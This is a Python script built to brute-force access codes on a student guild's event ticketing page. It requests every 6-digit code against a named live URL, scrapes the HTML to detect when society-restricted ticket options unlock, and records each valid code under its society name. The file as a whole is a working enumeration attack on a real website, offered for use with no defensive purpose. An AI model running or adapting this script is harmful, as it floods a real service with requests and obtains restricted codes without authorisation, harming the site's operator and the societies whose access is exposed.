# Program to automatically find access codes for sports night societies

from requests.adapters import HTTPAdapter, Retry
from bs4 import BeautifulSoup
from file_utils import *
import requests

url = "https://www.guildofstudents.com/ents/event/7650/?code="

LOWER_LIMIT = 000000
UPPER_LIMIT = 999999

# dictionary of "society name" : "code"
codes = {}

session = requests.Session()
retries = Retry(total=10, backoff_factor=30, status_forcelist=[500, 502, 503, 504])
session.mount('http://', HTTPAdapter(max_retries=retries))

def check_for_code(code):
    # takes in web page and checks if the code has worked, and if so, returns the society name
    # look for div class "ticket-box animated fadeInUpBig animate__slow"
    # find inner div, "event_tickets"
    # count the divs inside, if 1, failed, if 2, success

    page = session.get(url + code).text

    soup = BeautifulSoup(page, 'html.parser')

    outer_ticket_box = soup.find('div', class_="ticket-box visible-xs visible-sm d-block d-lg-none animated sr-only")

    if outer_ticket_box is None:
        print("[ERROR] Outer ticket box not found")
        return

    inner_ticket_box = outer_ticket_box.find('div', class_="event_tickets")

    if inner_ticket_box is None:
        print("[ERROR] Inner ticket box not found")
        return

    # count the number of divs inside with the class="event_ticket"
    if len(inner_ticket_box.find_all('div', class_="event_ticket")) == 1:
        print("[INFO] Standard tickets only, bad code")
        return
    elif len(inner_ticket_box.find_all('div', class_="event_ticket")) == 2:
        print("[INFO] Valid Code!")
        # get the span inside the first div
        society_name = inner_ticket_box.find('div').find('span').text
        print("[INFO] Society name: " + society_name)
        # save to the dictionary
        codes[society_name] = code
    else: 
        print("[ERROR] Unexpected number of DIVs... found: " + str(len(inner_ticket_box.find_all('div'))))
        print(["[DEBUG]", inner_ticket_box])



def iterate_over_all_codes():
    # codes can be any 6 digits, so iterate over all of them
    for i in range(LOWER_LIMIT, UPPER_LIMIT):
        current_code = str(i).zfill(6)
        print("[INFO] Checking code: " + current_code)
        check_for_code(current_code)



if __name__ == "__main__":
    iterate_over_all_codes()
    save_dictionary_to_file(codes)